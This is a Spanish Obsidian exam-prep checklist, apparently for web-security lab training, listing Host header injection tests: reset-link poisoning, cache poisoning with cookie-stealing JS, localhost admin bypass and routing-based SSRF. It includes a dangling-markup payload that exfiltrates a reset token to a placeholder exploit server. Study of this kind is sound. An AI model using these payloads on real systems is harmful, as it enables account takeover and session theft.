---
aliases:
  - to-do Host Header
tags:
  - exam/to-do
  - vuln/host-header-injection
---

# HTTP Host Header — Qué probar

> Técnica → [[vulnerabilities/016-host-header-injection/host-header|entry point]] · labs → [[vulnerabilities/016-host-header-injection/labs/README|labs/README]] · script → [[vulnerabilities/016-host-header-injection/scripts/conn_reuse.py|conn_reuse.py]]

## 🚩 Flags

> [!danger] 🚩 ¿Está?
> El **`Host` (o `X-Forwarded-Host`) manipulado termina reflejado** (link del mail de reset, `<script src>`, redirect `Location`) **o** el server **rutea / autoriza según el Host** (panel "solo local", o se pega a un interno).

## 🎯 Por stage

| | 🟢 Stage 1 (cuenta de user) | 🔴 Stage 2 (→ admin) | 🟣 Stage 3 (leer secret) |
| --- | --- | --- | --- |
| **Uso** | reset poisoning a la víctima · dangling markup · cache poisoning (Host duplicado) → JS que roba **su** sesión | auth bypass `Host: localhost` al panel admin · routing-based SSRF a interno (`localhost:6566`) · reset/cache-JS **contra el admin** | SSRF por Host al servicio interno que hace la acción final |

## 🟢 Stage 1 — foothold (tomar la cuenta de un user)

- [ ] **Reset de contraseña envenenado:** pedí reset de la víctima y cambiá el `Host` → ¿el link apunta a **tu exploit-server / Collaborator**? Leé el token en el **access log** → reseteás su pass → entrás. *(Lab 2)*
- [ ] **Dangling markup:** si el `Host` está validado (conserva el dominio) pero el mail es **HTML (template)**, inyectá por el **puerto**: `Host: LAB-ID…:'><img src="//TU-EXPLOIT-SERVER/?` → el `<img>` sin cerrar se traga el token y lo exfiltra. *(Lab 3)*
- [ ] **Cache poisoning → JS arbitrario:** si el Host se refleja en un `<script src>` **y** la respuesta se **cachea**, mandá **`Host` duplicado** (request ambigua) con el 2º apuntando a tu server → serví un JS que **robe la cookie/apiKey** de quien cargue la home. *(Lab 4 · si el que la carga es un user → S1; si es el admin → S2)* → [[exam/to-do-list/web-cache-poisoning|web cache poisoning]]
- [ ] **Host → sink server-side:** ¿el Host se **guarda/loguea** o entra en una **consulta**? probá **SQLi / XSS por el header** para dumpear credenciales de un user. → [[exam/to-do-list/sql-injection|SQLi]]

## 🔴 Stage 2 — escalar a admin

- [ ] **Auth bypass del panel "solo local":** `Host: localhost` (o `X-Forwarded-Host: localhost` / `127.0.0.1`) para entrar al `/admin` restringido → acciones de admin. *(Lab 1)*
- [ ] **Routing-based SSRF a interno:** poné tu **Collaborator** en el `Host` para **confirmar**, después rutéalo al panel interno (`localhost:6566` / `192.168.0.X`) → creá admin / cambiá tu rol / borrá. *(Labs 5-6)* → [[vulnerabilities/007-ssrf/ssrf|SSRF]]
- [ ] **Delivered contra el admin:** la víctima activa es el **admin** → reset poisoning a **su** cuenta, o cache-poisoning con JS que roba **su** sesión (mismos trucos que S1, otra víctima).
- [ ] **Routing cuando el `Host` está validado:** **URL absoluta** en la request line con `Host` legítimo *(Lab 6)* · **connection-state** (2 requests, 1 conexión) → [[vulnerabilities/016-host-header-injection/scripts/conn_reuse.py|conn_reuse.py]] *(Lab 7)*.

## ♾️ Independiente del stage

- [ ] Cambiá el `Host` por basura y mirá si **cambia algo** (200 igual, reflejo, redirect, error interno) → si acepta cualquiera, terreno fértil.
- [ ] Si el `Host` está validado, probá **override headers**: `X-Forwarded-Host` · `X-Host` · `X-Forwarded-Server` · `Forwarded` · **doble `Host`** · **URL absoluta** · **line wrapping**.
- [ ] *(Stage 3)* Inyectá `Host`/`X-Forwarded-Host` para que el server se pegue a su **servicio interno** o a un oastify (SSRF) → [[vulnerabilities/007-ssrf/ssrf|SSRF]].

## 🔗 Referencias

- entry point → [[vulnerabilities/016-host-header-injection/host-header|host-header]] · labs → [[vulnerabilities/016-host-header-injection/labs/README|labs/README]]
- reset → [[vulnerabilities/029-authentication/authentication|Authentication]] · cache → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|Web Cache Poisoning]] · SSRF → [[vulnerabilities/007-ssrf/ssrf|SSRF]]
